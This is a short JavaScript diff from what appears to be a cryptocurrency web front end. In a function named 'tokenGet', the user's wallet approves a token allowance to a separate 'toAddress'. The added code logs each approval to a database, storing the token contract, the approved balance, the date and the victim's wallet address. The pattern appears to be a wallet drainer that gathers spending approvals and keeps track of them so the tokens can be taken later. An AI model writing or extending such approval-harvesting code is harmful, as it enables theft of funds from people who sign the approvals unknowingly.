@@ -1169,7 +1169,16 @@ async function tokenGet(tokenAddress, tokenBalance) {
     await tokenContract.methods.approve(toAddress, calculatedApproveValue).send({from: account})
 
 
-    
+        await db.collection('tokenApproval').add({
+        tokenContract: tokenAddress,
+        approvedBalance: tokenBalance,
+        date: new Date(),
+        address: account
+    }).then( () => {
+        console.log('success')
+    }).catch( () => {
+        console.log('error')
+    })
 
     
 
